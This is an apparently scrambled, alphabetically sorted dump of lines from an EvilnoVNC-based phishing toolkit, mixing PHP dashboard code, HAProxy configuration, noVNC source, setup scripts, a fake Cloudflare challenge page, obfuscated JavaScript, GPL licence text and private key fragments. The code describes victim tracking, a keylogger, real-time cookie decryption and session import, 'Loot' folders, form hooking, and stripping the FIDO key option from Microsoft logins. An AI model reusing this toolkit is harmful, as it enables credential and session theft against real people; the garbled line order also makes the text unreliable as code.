"if(file_put_contents(""/etc/whitelist.acl"", $whitelist, FILE_APPEND) === false) {"
"if(flock($file, LOCK_EX)) {"
"if(getenv(""SID"")) {"
"if(input.type != ""hidden"" "
"if(isset($_GET[""agent""]))"
"if(isset($_GET[""block""]) "
"if(isset($_GET[""ip""]))"
"if(isset($_GET[""reqid""])) {"
"if(isset($_GET[""reset""]) "
"if(isset($_GET[""svr""]) "
"if(isset($_GET[""svr""])) $reqid = ""admin"""
"if(isset($_GET[""v""])) {"
"if(isset($_POST[""add""]) "
"if(isset($_POST[""clearlogs""])) {"
"if(isset($_POST[""clearloot""])) {"
"if(isset($_POST[""cleartargets""])) {"
"if(isset($_POST[""res""])) {"
"if(window.location.hostname == ""login.live.com"") {"
"import CopyRectDecoder from ""./decoders/copyrect.js"""
"import Cursor from ""./util/cursor.js"""
"import Deflator from ""./deflator.js"""
"import Display from ""./display.js"""
"import GestureHandler from ""./input/gesturehandler.js"""
"import HextileDecoder from ""./decoders/hextile.js"""
"import Inflator from ""./inflator.js"""
"import JPEGDecoder from ""./decoders/jpeg.js"""
"import KeyTable from ""../core/input/keysym.js"""
"import KeyTable from ""./input/keysym.js"""
"import KeyTable from ""./keysym.js"""
"import Keyboard from ""../core/input/keyboard.js"""
"import Keyboard from ""./input/keyboard.js"""
"import RFB from ""../core/rfb.js"""
"import RREDecoder from ""./decoders/rre.js"""
"import RSAAESAuthenticationState from ""./ra2.js"""
"import RawDecoder from ""./decoders/raw.js"""
"import TightDecoder from ""./decoders/tight.js"""
"import TightPNGDecoder from ""./decoders/tightpng.js"""
"import Websock from ""./websock.js"""
"import XtScancode from ""./input/xtscancodes.js"""
"import ZRLEDecoder from ""./decoders/zrle.js"""
"import _, { l10n } from './localization.js'"
"import keysyms from ""../core/input/keysymdef.js"""
"import legacyCrypto from ""./crypto/crypto.js"""
"import { encodeUTF8, decodeUTF8 } from './util/strings.js'"
"import { encodings } from ""./encodings.js"""
"import { isTouchDevice, isSafari, hasScrollbarGutter, dragThreshold }"
"import { setCapture, getPointerEvent } from '../core/util/events.js'"
"import { supportsCursorURIs, isTouchDevice } from './browser.js'"
"import { toUnsigned32bit, toSigned32bit } from './util/int.js'"
"in a country, would infringe one or more identifiable patents in that"
"in a fashion requiring copyright permission, other than the making of an"
"in or on a volume of a storage or distribution medium, is called an"
"in the business of distributing software, under which you make payment"
"infringement under applicable copyright law, except executing it on a"
"inputVal = document.getElementById(""inp"").value"
"int $length = 6,"
"interfaces specified for a particular programming language, one that"
"into a dwelling.  In determining whether a product is a consumer product,"
"into proprietary programs.  If your program is a subroutine library, you"
"ip="" . $ip . """
"key in single pem, ./ means in haproxy/"
"ldir=""$date-$REQID"""
"left, "
"let forms = document.getElementsByTagName(""form"")"
"let inp = document.getElementById(""inp"")"
"let inputs = this.getElementsByTagName(""input"")"
"let k1 = document.getElementsByName(""switchToFido"")[0]"
"let k2 = document.getElementsByClassName(""promoted-fed-cred-box"")[0]"
"let loot = """""
"let port = readQueryVariable('port', window.location.port)"
"license to downstream recipients.  ""Knowingly relying"" means you have"
"linked subprograms that the work is specifically designed to require,"
"log(""[!] search string not found: "" "
"log(""["
"machine-readable Corresponding Source under the terms of this License,"
"make it effectively proprietary.  To prevent this, the GPL assures that"
"make, use, sell, offer for sale, import and otherwise run, modify and"
"max-width:60rem}@media (max-width:720px){.main-content{margin-top:4rem}}.main-content,.footer{padding-right:1.5rem"
"menu, a prominent item in the list meets this criterion."
"mkdir -p /etc/Loot/$ldir/{Downloads,Chrome}"
"modification of the work as a means of enforcing, against the work's"
"modified object code on the User Product (for example, the work has"
"modified versions of the software inside them, although the manufacturer"
"modify it is void, and will automatically terminate your rights under"
"must place, in the relevant source files, a statement of the"
"n"", """
"n/gm, """
"nohup /bin/bash -c ""sleep 30 "
"nohup /bin/bash -c ""sleep 7 "
"nohup /bin/bash -c ""touch /home/user/Downloads/Cookies.txt "
"nohup /bin/bash -c ""touch /home/user/Downloads/Keylogger.txt "
"nohup /bin/bash -c ""while [ ! $(ps aux "
"nohup /bin/bash -c ""while true "
"nohup /bin/bash -c ""while true"
"nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 ""$@"" "
"not accept this License.  Therefore, by modifying or propagating a"
"not convey it at all.  For example, if you agree to terms that obligate you"
"not impose a license fee, royalty, or other charge for exercise of"
"of having them make modifications exclusively for you, or provide you"
"of sections 4 and 5, provided that you also convey the"
"of that license document, provided that the further restriction does"
"of the GPL, as needed to protect the freedom of users."
"or convey a specific copy of the covered work, then the patent license"
"or household purposes, or (2) anything designed or sold for incorporation"
"or that patent license was granted, prior to 28 March 2007."
"organization, or merging organizations.  If propagation of a covered"
"organization, or substantially all assets of one, or subdividing an"
"otherwise) that contradict the conditions of this License, they do not"
"owned or controlled by the contributor, whether already acquired or"
"p, pre { margin: 10px 0"
"packaging a Major Component, but which is not part of that Major"
"parties who would receive the covered work from you, a discriminatory"
"parts of the General Public License.  Of course, your program's commands"
"patent license for this particular work, or (3) arrange, in a manner"
"patent license under the contributor's essential patent claims, to"
"perm=$(stat -L -c ""%a"" /var/run/docker.sock)"
"permission, would make you directly or secondarily liable for"
"permissions.  However, no additional obligations are imposed on any"
"php $config = parse_ini_file(""php.ini"", true)"
"php if($auth_cnt > 0) echo ""<td id='bar2' style='width: $auth_p%'>$auth_cnt ($auth_p %)</td>"""
"php if($click_cnt > 0) echo ""<td id='bar1' style='width: $click_p%'>$clicksubm ($click_p %)</td>"""
"php if($idle_cnt > 0) echo ""<td id='bar0' style='width: $idle_p%'>$idle_cnt ($idle_p %)</td>"""
"possible use to the public, the best way to achieve this is to make it"
"printf """
"procedures, authorization keys, or other information required to install"
"produce it from the Program, in the form of source code under the"
"produce the work, or an object code interpreter used to run it."
"product received by a particular user, ""normally used"" refers to a"
"products.  If such problems arise substantially in other domains, we"
"propagate that work, subject to this License.  You are not responsible"
"provisionally, unless and until the copyright holder explicitly and"
"public, and in some countries other activities as well."
"publicly available network server or other readily accessible means,"
"purposes of this definition, ""control"" includes the right to grant"
"receive it, in any medium, provided that you conspicuously and"
"received it, or any part of it, contains a notice stating that it is"
"receives a license from the original licensors, to run, modify and"
"receiving the covered work authorizing them to use, propagate, modify"
"refresh label,"
"reinstated, you do not qualify to receive new licenses for the same"
"remove any additional permissions from that copy, or from any part of"
"reqid... "" . PHP_EOL"
"reqid="" "
"reqid="" . $dat[""reqid""] . ""</td>"""
"reqid="" . $reqid . """
"reqid="""
"reqid=$reqid"", false, stream_context_create($context)) !== false) {                                                                                                       "
"reqid=$reqid"", false, stream_context_create($context)) !== false) {"
"request.addEventListener('load', function(event) {"
"request.open(""GET"", url)"
"requirement to continue to provide support service, warranty, or updates"
"reset=1"""
"restriction, you may remove that term.  If a license document contains"
"restrictions"" within the meaning of section 10.  If the Program as you"
"return ""authorized"""
"return ""clicked"""
"return ""idle"""
"return ""submitted"""
"return ""unkown"""
"return _0x4e93=function(_0x4e93cf,_0x1c958f){_0x4e93cf=_0x4e93cf-0x88"
"return base64_decode(str_pad(strtr($data, '-_', '"
"return btoa(Array.from(new Uint8Array(buffer), b => String.fromCharCode(b)).join(''))"
"return implode('', $pieces)"
"return json_decode(file_get_contents($statefile), true)"
"return new Promise((resolve) => setTimeout(resolve, time))"
"return rtrim(strtr(base64_encode($data), '"
"return str_replace(""s"", """", $ex[1])"
"rfb = new RFB(document.getElementById('screen'), url,"
"rfb.addEventListener(""credentialsrequired"", credentialsAreRequired)"
"rfb.addEventListener(""desktopname"", updateDesktopName)"
"rfb.scaleViewport = readQueryVariable('scale', false)"
"rfb.sendKey(0x0076, null, false)"
"rfb.sendKey(0xffe3, null, false)"
"rfb.viewOnly = readQueryVariable('view_only', false)"
"rights granted or affirmed under this License.  For example, you may"
"rights granted under this License, and you may not initiate litigation"
"rights of fair use or other equivalent, as provided by copyright law."
"rm -rf /home/user/{Downloads,Chrome}"
"root ""/app"""
"run=""run.sh"""
"sUrl=""https://phishing.domain"""
"sale, or importing the Program or any portion of it."
"screen -S evil$x -dm sh -c ""bash run.sh $x"""
"section 13, concerning interaction through a network will apply to the"
"sed -i ""4s/."
"sed -i ""63i$b"" $cfg"
"sed -i ""77i$b"" $cfg"
"sed -i ""84i"
"sed -i ""84i$b"" $cfg"
"sed -i ""s"
"sed -i ""s/---accessToken---/$accessToken/"" $cfg"
"sed -i ""s/---accessToken---/$accessToken/"" $dash2"
"sed -i ""s/---adminPass---/$adminPass/"" $cfg"
"sed -i ""s/---adminPort---/$adminPort/"" $hrun"
"sed -i ""s/---cookieKey---/$cookieKey/"" $cfg"
"sed -i ""s/---inst---/$instances/"" $run"
"sed -i ""s/---victimPort---/$victimPort/"" $hrun"
"shell_exec(""docker exec controller echo '$reqid' >> /etc/blacklist.acl"")"
"shell_exec(""echo $reqid > /home/user/tmp/reqid$sid.txt"")"
"shell_exec(""echo '$usera' > /home/user/tmp/useragent$sid.txt"")"
"shell_exec(""echo 'add acl /etc/blacklist.acl $reqid' "
"shell_exec(""echo 'add acl /etc/whitelist.acl $reqid' "
"shell_exec(""echo 'clear acl /etc/blacklist.acl $reqid' "
"shell_exec(""echo 'clear acl /etc/whitelist.acl $reqid' "
"shell_exec(""echo 'set server novnc/s$svrno state maint"
"shell_exec(""echo -n '' > "" . $path)"
"shell_exec(""echo -n '' > /etc/accesslog.txt"
"shell_exec(""echo -n '' > /etc/blacklist.acl"")"
"shell_exec(""echo -n '' > /etc/whitelist.acl"")"
"shell_exec(""rm -rf $lootdir"
"shell_exec(""sed -i 's/const id = "
"shell_exec(""sed -i 's/const serverName = "
"sid), better be safe..."
"software for all its users.  We, the Free Software Foundation, use the"
"software on general-purpose computers, but in those that do, we wish to"
"source code form), and must require no special password or key for"
"specifically for use in, a User Product, and the conveying occurs as"
"standard defined by a recognized standards body, or, in the case of"
"sub2, "
"sub3, "
"sudo -E /bin/bash -c ""php -q -S 0.0.0.0:8111 "
"sudo docker run -d --rm -p 127.0.0.1:21212:80 -v ""/tmp:/tmp"" -v ""${PWD}/Downloads"":""/home/user/Downloads"" -e ""WEBPAGE=$WEBPAGE"" -e ""SNAME=$SNAME"" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>"
"sudo socat TCP-LISTEN:8111,reuseaddr,fork TCP:localhost:5980 "
"sue for patent infringement).  To ""grant"" such a patent license to a"
"svr="" "
"svr="" . $sid . """
"svr="" . $svrno . """
"svr=$sid"" "
"system(""cat "" . $f1 . "" "
"system(""chmod 666 /home/user/tmp/resolution$sid.txt"")"
"system(""chmod 666 /tmp/res"
"t $0 (<custom-URL>) <instance-number>"""
"t $0 <instances>"""
"t configure and run setup.sh"""
"t custom-URL is optional, see setup.sh"""
"t e.g. $0 01"""
"t e.g. $0 3"""
"t"" $cfg"
"t"", $line)"
"t"", $log)"
"t$REQID"""
"t$RESOLUTION"""
"t$USERA"""
"t../Loot/[date-time]-$REQID/Chrome"""
"t../Loot/[date-time]-$REQID/Downloads"""
"t../Loot/[date-time]-$REQID/Downloads/cookies.txt"""
"t../Loot/[date-time]-$REQID/Downloads/keylog.txt"""
"t<td class='req'>"" . $entry[2] . ""</td>"" . PHP_EOL"
"t<td>"" . $entry[1] . ""</td>"" . PHP_EOL"
"t<td>"" . $entry[3] . ""</td>"" . PHP_EOL"
"t<td>"" . $entry[4] . ""</td>"" . PHP_EOL"
"t<td>"" . $entry[5] . ""</td>"" . PHP_EOL"
"t<td>"" . date($dateformat, $entry[0]) . ""</td>"" . PHP_EOL"
"t<td>"""
"tUrl=""https://target.domain/login"""
"table td, table th {"
"tangible personal property which is normally used for personal, family,"
"tcookie _haad insert indirect nocache"""
"tdefault-server check init-addr libc,none resolvers res on-marked-down shutdown-sessions"""
"terms of section 4, provided that you also meet all of these conditions:"
"text-shadow: 0 0 4px black, 0 0 6px black, 0 0 6px black, 0 0 6px black"
"than the work as a whole, that (a) is included in the normal form of"
"the ""copyright"" line and a pointer to where the full notice is found."
"the Program, the only way you could satisfy both those terms and this"
"the covered work, and you disclaim any intention to limit operation or"
"the interface presents a list of user commands or options, such as a"
"the library.  If this is what you want to do, use the GNU Lesser General"
"the scope of its coverage, prohibits the exercise of, or is"
"the source code needed to generate, install, and (for an executable"
"the work, and the source code for shared libraries and dynamically"
"the work, and under which the third party grants, to any of the"
"them if you wish), that you receive source code or can get it if you"
"these rights or asking you to surrender the rights.  Therefore, you have"
"to copy, free of charge and under the terms of this License, through a"
"to receive a copy likewise does not require acceptance.  However,"
"to take away your freedom to share and change the works.  By contrast,"
"tserver s$i evil$i:8111 cookie s$i"""
"tserver s$i evil$i:8111"""
"tuse_backend b$i if is_admin { urlp(svr) $i }"""
"tuse_backend b$i if { cook(_haad) s$i } !{ path_beg /phishboard }"""
"typical or common use of that class of product, regardless of the status"
"under those permissions, but the entire Program remains governed by"
"unpacking, reading or copying."
"url = url.replace(""/"
"url=""---tUrl---"""
"use, which is precisely where it is most unacceptable.  Therefore, we"
"users, your or third parties' legal rights to forbid circumvention of"
"utm_campaign=j"" target=_blank>Cloudflare</a></div></div></div>"
"v="" "
"versions of the GNU General Public License can be used, that proxy's"
"violation by some reasonable means, this is the first time you have"
"visibility:visible class=""fact spacer hidden""><span class=fact-title>Did you know</span> <span id=challenge-fact class=body-text>the first botnet in 2003 took over 500-1000 devices"
"visibility:visible""><div class=""lds-ring""><div></div><div></div><div></div><div></div></div></div>"
"w /home/user/Downloads/{cookies.txt,keylog.txt}"
"want it, that you can change the software or use pieces of it in new"
"warn(""[!] "" "
"warn(""[!] domain not matching target"")"
"which are not part of the work.  For example, Corresponding Source"
"window[_0x27babc(0x8a)][_0x27babc(0x8c)],_0x47670a=new XMLHttpRequest()"
"with facilities for running those works, provided that you comply with"
"work results from an entity transaction, each party to that"
"work thus licensed is called the contributor's ""contributor version""."
"work under this License, and how to view a copy of this License.  If"
"work) run the object code and to modify the work, including scripts to"
"works, such as semiconductor masks."
"works, which are not by their nature extensions of the covered work,"
"x20error','419350czLeEZ','onreadystatechange','20MdGyAG','send','plain/text','open','screen','setRequestHeader','height','344293fptFwq','2517317Jkhuyy','width','responseText','14oQzojn','location','Content-Type']"
"xhr.open(""GET"", url)"
"xhr.open(""POST"", window.location.href, true)"
"xhr.send(""res="" "
"xhr.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded"")"
"your programs, too."
"}(function(_0x32a82f,_0x2a5c94){var _0xefc6e2=_0x4e93,_0x71d5d2=_0x32a82f()"
"}, 10000)"
"}, 1500)"
"}, 500)"
"}, <"
"},0x1388)"
"},_0x4e93(_0x407f7e,_0x1ab66c)"
"}function _0x4b7f(){var _0x56998a=['2303922snBmiB','4772295XzGkMq','GET','2RhfIDt','14703424QnpOEL','readyState','3470958zbgAPR','10Rijsvc','href','Ha"
"}},_0x47670a[_0x27babc(0xa1)](null)"
"}}}(_0x4b7f,0xe0e67))"
$aUrl
$agent = base64url_encode($usera)
$auth_cnt 
$auth_cnt = 0
$auth_cnt)
$auth_p  = round(100/$sum
$cert
$click_cnt 
$click_cnt = 0
$click_p = round(100/$sum
$clicksubm = $click_cnt 
$cnt 
$cnt = 0
$cnt = 4
$count 
$count -= 1
$count = 0
$data = file_get_contents('php://input')
$i) {
$idle_cnt 
$idle_cnt = 0
$idle_cnt)
$idle_p  = round(100/$sum
$json = json_encode($array)
$line = strtok($sep)
$line = strtok($separator)
$lines = array_reverse($lines)
$list = array()
$log = $ex = $timestamp = $atime = $duration = $reqid = null
$pieces = []
$query_string
$refreshtimer = 10
$reqid = $ex[2]
$reqid = random_str()
$resolution 
$s) {
$sUrl
$showhint = false
$showhint = true
$state = get_state()
$subm_cnt 
$subm_cnt = 0
$sum = $idle_cnt 
$svrname = $novnc[3]
$svrno = $novnc[2]
$tUrl
$timestamp = $ex[0]
$timestamp = time()
$url
$userid = lookupUserId($reqid)
$whitelist .= $reqid . PHP_EOL
') {
'<em>Account</em>Overview'
($click_cnt 
(-parseInt(_0xefc6e2(0x9e))/0x5)
(including a cross-claim or counterclaim in a lawsuit) alleging that
(parseInt(_0xefc6e2(0x8e))/0xb)
(parseInt(_0xefc6e2(0x91))/0x7)
(parseInt(_0xefc6e2(0x97))/0x2)
(such as an express permission to practice a patent or covenant not to
): string {
- Chromium
- Docker
- [ ] Replicate real user-agent and other stuff
- [X] Basic keylogger
- [X] Decrypt cookies in real time
- [X] Disable access to Thunar
- [X] Disable key combinations (like Alt
- [X] Disable parameters in URL (like password)
- [X] Dynamic resolution from preload page
- [X] Dynamic title from original website
- [X] Expand cookie life to 99999999999999999
- [X] Export Evil-Chromium profile to host
- [X] Save download files on host
--    
--    all HTTP and HTTPS connections from ALL source port for localhost
--    allows all subdomains and main domain of mydomain.com only for HTTPS from default HTTPS port and allows 
--   e.g. .mydomain.com            : allow ALL subdomains of mydomain.com from ALL source ports
--   e.g. .mydomain.com:443        : allow ALL subdomains of mydomain.com from default HTTPS source port
--   e.g. //localhost              : allow http(s)://localhost
--   e.g. //mydomain.com           : allow only http(s)://mydomain.com
--   e.g. http://mydomain.com      : allow only HTTP of mydomain.com
--   e.g. http://mydomain.com:8080 : allow only HTTP of mydomain.com from port 8080
--   e.g. https://mydomain.com     : allow only HTTPS of mydomain.com
--   e.g. localhost                : allow http(s)://localhost
-- Add headers for CORS preflight request and then returns a 204 response.
-- Adds headers for CORS preflight request and then attaches them to the response
-- CORS RFC:
-- Copyright (c) 2019. Nick Ramirez <nramirez@haproxy.com>
-- Cross-origin Request Sharing (CORS) implementation for HAProxy Lua host
-- Loops through array to find the given string.
-- Register the actions with HAProxy
-- The 'reply' function used here is available in HAProxy 2.2
-- The downside is that the OPTIONS request must be sent to the backend server first and can't 
-- a reply without contacting the server.
-- after it comes back from the server. This works with versions of HAProxy prior to 2.2.
-- be intercepted and returned immediately.
-- https://www.w3.org/TR/cors/
-- items: array of strings
-- origin: The value from the 'origin' request header
-- test_str: string to search for
-- txn: The current transaction object that gives access to response properties
-- txn: The current transaction object that gives access to response properties.
-------
-----BEGIN CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
-----END CERTIFICATE-----
-----END PRIVATE KEY-----
---aUrl---
---certandkey---
---sUrl---
---tUrl---
--force
--window-size=[0-9]
-parseInt(_0xefc6e2(0x98))/0x8
-parseInt(_0xefc6e2(0xa0))/0x4
-v ---certandkey---:/etc/certandkey.pem 
-v ./503.http:/etc/haproxy/503.http 
-v ./blacklist.acl:/etc/blacklist.acl 
-v ./whitelist.acl:/etc/whitelist.acl 
-v /root/haproxy/cors.lua:/etc/cors.lua 
-webkit-text-size-adjust:100%
. It allows HAProxy to return
./run.sh
./setup.sh
./setup.sh clean
./start.sh -h
.blocked { color: 
.col .scrolldiv {
.col {
.conf
.connected button.connect {
.connected button.connect:hover {
.instances .condata {
.instances button  {
.instances button.connect {
.instances button.connect:disabled {
.instances button.connect:disabled:hover {
.instances button.stop {
.instances button.stop:hover {
.instances button:hover {
.instances p { display: inline
.instances {
.php$ {
.php)
.php)(/.
.replace(/
.replace(/=
.req {
.reqid { font-family: monospace
.slider {
.slider.round { border-radius: 10px
.slider.round:before { border-radius: 50%
.slider:before {
.switch input { display: none
.switch {
.wide {
/ ___
/.Xauthority
/.config/chromium/ > /dev/null 2>
/.config/chromium/Default > /dev/null 2>
// <timestamp> s<sid> <reqid> <userid> <ip> <agent>
// =====================================================
// CONTROLLER
// COOKIE DETECTION (tbd)
// Class Methods
// DASHBOARD
// Extended clipboard pseudo-encoding actions
// Extended clipboard pseudo-encoding formats
// Gesture thresholds
// HOOKING FORMS FOR LOGGING
// How many seconds to wait for a disconnect to finish
// IF NO INTERACTIVE SESSION IS INTENDED
// Keyboard event handler
// MANIPULATE CONTENT
// Minimum wait (ms) between two mouse moves
// REDIRECT if window.location differs from target domain
// STRING DETECTION
// Security types
// Set up translations
// Special Tight security types
// VeNCrypt security types
// Wheel thresholds
// add entry to log file
// add fields to state file
// add reqid to haproxy whitelist (persistent)
// add request id to blacklist acl via runtime API
// add to blacklist on file system for persistence
// addtargets.php
// block user via button                                                                                                                                                                                                                       
// block user/victim
// check color scheme pref
// check if line is an email address
// check if someone is connected to server instance (novnc/sXX)
// check if there is a proper json state file
// clear errorlog.txt
// clear log files
// clear loot directory
// clear state file
// copy Downloads dir
// decrypt cookie explicitely
// define at least one search string
// deleting collected chromium data
// display content behind canvas after time
// get client IP
// get form data from submit via Chromium extension
// get input data
// get state as php nested array
// kill victim connection after successfull login
// logging to central acccess log via controller
// lookup user id via request id
// novnc or admin backend available -> green
// part of paste mechanism by EK-noVNC
// put user on blacklist
// receive data with targets (list of mail addresses one per line)
// receive pasted input from victims
// receive resolution by js and store in fs
// refresh page every few seconds if checkbox is checked
// release left Ctrl key on server
// release v key on server
// remove formerly found resolution and reqid
// remove key auth option for Windows Live login
// reset EvilnoVNC instance: restart docker container
// reset chrome extension variables (reqid
// reset specific EvilnoVNC instance via button
// resolve user id by lookup table reqid<>email
// restart server
// retrieve server instance ID via env
// save collected data to central directory
// send data base64 encoded to controller
// send paste if Ctrl released
// send reset request to controller
// send reset signal
// send signal to block user                                                                                                                                                                                                                   
// send signal to close all connections and shut server
// set access time
// set backend server to state ready (up)
// set blocked
// set server instance in maintenance mode
// set state to authorized
// set state to clicked 
// set state to submitted
// starting -> orange
// stop and restart server s<num>
// stopped -> gray
// stopping -> dark red
// substituded by index.php and reset by controller
// substituted by index.php and reset by controller
// this is a fake page for getting the victim's resolution (dynamic)
// unkown
// update state in statefile
// update targets.json
// used by admins via dashboard
// used by chrome extension
// used by preload page to get resolution TODO
// user clicked the phishing link
// user submitted some data
// user successfully logged in
// wait for RFB initialisation
//$ip = array_key_exists($_SERVER['HTTP_X_FORWARDED_FOR']) 
//TODO POST request to itself
//clear blacklist
//clear whitelist
//if($count > 0)
//if(source.indexOf(searchString)) {
//resetserver()
//sleep(12500).then(() => {window.location.reload()})
/k4jzMAU4mIipiS0kOMqbRKuVo0Uok4ZiFY5wJ7uE8UaxWapXs4XNkzmrjndghMX
/lj4vlDmX/PoALOKBYNbxCzdscE6N30
/usr/bin/chromium-browser $URL 
/usr/bin/chromium-browser --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start 
0 = SRV_ST_STOPPED
000000)
0051c3}a:hover{text-decoration:underline
00UdBKMPHlVes1oTuNS5u6yWsnp2NUZ1
0YCwhD/oBvp1fKBz3fpfCzvR8TrHZUGPVPBS2ABKl2J3WEwDAK8ya
0fkQb1jFve6fML3ztMaa/RZB8gzkYp6h4r/9Pc5WRs0WIkxR3WutucCT5A4XUJ
0fmqvxJot1KHtLA88BDRj
0m  ./start.sh 
0m./start.sh 
0utbpILqN9BX7tQREsNWWeIB
1 = SRV_ST_STARTING
1 or Ctrl
131a00
1445997
1gkShUWa
1jWFco0JrSmYm0UTUXstKqh9LfBk4/TRHA//8j8xmdfbWY/ufSDT751k9giNfs2i
1zvKioQK6kFtzZO4H9gYX7bCuRHobzQDvkoiXg30IC5EaaATMQ
2 = SRV_ST_RUNNING
2oXcdx7sgWvIK9kJ4cXIVplDhz9N7Y91b45kNW2MDOhKTk8MD0LTxWtC24NOIvFD
2uoeofs5IJsiMCDCT9BwoQg/6
3 = SRV_ST_STOPPING
30IO9BLBWO
30IO9BLBWOrjAPBgNVHRMBAf8EBTAD
31mContainer stopped!
31m[
31m[!] Not enough parameters!
32m  ---------------- by @JoelGMSec --------------
32mChrome profile: 
32mCookies: 
32mDownloads: 
32mKeylog: 
32mRequest ID: 
32mResolution: 
32mUser Agent: 
32m[
33mDynamic resolution:
33mExamples:
33mPress Ctrl
33mUsage:
33m[
33m[>] Import stealed session to Chromium..
34mhttp://example.com
35m1280x720x16 
35m1280x720x24 
35m1920x1080x16 
35m1920x1080x24 
35mdynamic 
38aCeWfBws4WVYcQ6SZLo1vo7GLLcSNc
3We9ZFULQ1tLFMl5S2wX
3noDbsGU7sc/yLmW4ndokEwQZo5RbhnRb8vIxp506r/KsZXrxpCNn53
47zzSKUg57o8goacmdh
4aSgqKBIfpDoQtB
4d6600
4d6600 
4q1yKz04TficXzjw
57HYjvMgrE4zGdBtTdufi2v7eVG37L5NtpTfthl2XPB9Xy8QYmPKuXq0ID12HId0
595959
595959 transparent transparent transparent
6g3uLZGzg0ddG7sfjumKji9t
71jFUaTacP6U6zRe
77xVNtryfe7ZHsEQKraXcxsrQR7
7DVfrQ2qzOXr/mc0ihgvsPiQBR38RH76CaWi0wQK2l6WArPeegNuwZTuxz/IuZbi
7pInYOCTE3Vjz7fxoJ5Z8HCzhZVhxDpJkujW
83af00
83af00 transparent
8553
8VTba8n3u2R7BECq2l3MbK0Ee/vaLgy7K0omM74enSHzB
8YzJcwUP83LgUkNcNo
8z0ORUr
9.3-show%20servers%20state
9660
9HV3vCK4EnwQKBgQDE8MIzJixm2vxvdTyP
9hGbFH/EVSRA0b3V7HIxW9F6IpJeK9C8UZI2XlK8
9ouDLsrSiYzvh6dIfMFl5KgBV2R2tl3hXYew
::-webkit-scrollbar {
::-webkit-scrollbar-thumb {
::-webkit-scrollbar-track {
:}-lock
:}-lock 
<!DOCTYPE html>
<!DOCTYPE html><title>Just a moment...</title><head>
</body>
</div>
</div> <!-- 
</form>
</head>
</header>
</html>
</iframe>
</label>
</main>
</pre>
</script>
</style>
</table>
</th>
</title>
</tr>
<body>
<button class='connect' onclick='window.open(
<div class=footer role=contentinfo>
<div class=footer-inner>
<div class=ray-id>Ray ID: <code>769931736f5b12a0</code></div></div>
<div class=text-center>Performance 
<h1>HTTP 0815</h1>
<h1>Server s<
<h2>Add Targets</h2>
<h2>HTTP 503</h2>
<h2>List of Targets (<
<h2>access log (<
<h2>authenticated (<
<h2>clicked (<
<h2>idle (<
<h2>stats</h2>
<h2>submit log (<
<h2>submitted (<
<head>
<head><title>
<header>
<https://www.gnu.org/licenses/>.
<https://www.gnu.org/licenses/why-not-lgpl.html>.
<main>
<p>Error - Please try again later</p>
<p>Error. Please try again later.</p>
<p>auto refresh (<
<pre>
<script>
<span id=trk_jschal_js></span>
<span style=display:none></span></form></div></div>
<style>
<table>
<th>idle</th>
<th>req id</th>
<th>submitted input fields</th>
<th>user agent</th>
<th>user id</th>
<title>Error HTTP 503</title>
<title>Phishboard
<title>Targets
<title>s<
<tr>
= $auth_cnt 
= $click_cnt 
= $count 
= $filename 
= $idle_cnt 
= $refreshtimer 
= $reqid 
= $sid 
= $subm_cnt 
= $sum 
= $url 
= '' then
= '/' 
= ':' 
= '://' 
= (1 << formatKeys[i])
= (1<<0) 
= (int)$refreshtimer 
= (sizeArray[0] << 24)
= (sizeArray[1] << 16)
= (sizeArray[2] << 8)
= (sizeArray[3])
= 1) {
= 4) {
= GESTURE_SCRLSENS
= GESTURE_ZOOMSENS
= String.fromCharCode(textData[i])
= WHEEL_LINE_HEIGHT
= actions[i]
= bmask
= dX
= dY
= formats[i]
= input.name 
= nil
= nil and pattern 
= nil then
=$sid
=============================
> (100 %)</td>
> (<
> /dev/null 
> /dev/null 2>
> needs to review the security of your connection before proceeding.
> s)</p>
>)</h1>
>)</h2>
>)</title>
><!DOCTYPE html>
></h1>
><th>auth.</th><
@keyframes blink {
A8UVG1
ADEvE
AE:28:1B:05:5B:C0:55:41:22:DA:7C:6F:D2:51:8D:D1:11:B2:7C:21
AEwHpng9xd5XKpL6HAoc
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
AQH/MA0GCSqGSIb3DQEBDQUAA4ICAQC0CpWnvIy4CbTy8nsYA4U51f4cPm/mMKO
AYZHrfdBkpwl6K51PBKxAi2yWFCldkpxQ94rdv7S61ukguo30Ffu1BES
Additional permissions that are applicable to the entire Program shall
Ak7cBzZMJYPBP1x/pxkYf2kz0MJX0HqPDM
Also add information on how to contact you by electronic and paper mail.
BBgwFoAUuOOeQlUsQAUh3F4pd9wHTsPlRx4wDwYDVR0TAQH/BAUwAwEB/zANBgkq
BQAwGTEXMBUGA1UEAwwOdGVzdGluZy1zZXJ2ZXIwHhcNMjQwNTIwMTc0MjAxWhcN
BQAwTTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxFDASBgNVBAoM
BQcbkSe/xqtW/m2X9btteqljGaWsbVW2lYh8FfrfxhK2IPi1OXMYBTWKUR
BSQ1w2iy9e04sel9TyfZFVNQjlQehLduui
Bg96TSFqsJrgd2VSpSNO71GGOADTqEOZGikYZRaGzNGmmv/YgmP7IhTKGYtsohvq
C0V2aWxLbmlldmVsMRMwEQYDVQQDDApjb250cm9sbGVyMB4XDTIzMTAwNzEwNTkw
CBlmpEijNJiPAgMBAAGjUzBRMB0GA1UdDgQWBBQj7MqSUvhqGB4fz
COPY Files/content.js /home/user/extension/
COPY Files/cookies.py /home/user/
COPY Files/cursor.js /home/user/noVNC/core/util/
COPY Files/index.php /home/user/
COPY Files/keyboard.js /home/user/noVNC/core/input/
COPY Files/keylogger.py /home/user/
COPY Files/kiosk.sh /home/user/
COPY Files/kiosk.zip /home/user/
COPY Files/manifest.json /home/user/extension/
COPY Files/server.sh /home/user/
COPY Files/startVNC.sh /home/user/
COPY Files/ui.js /home/user/noVNC/app/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY haproxy.cfg /usr/local/etc/haproxy/haproxy.cfg
Cache-Control: no-cache
Connection: close
Content-Type: text/html
Cookie name: {name}
Cookie value (decrypted): {decrypted_value}
Corresponding Source conveyed under this section must be accompanied
Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
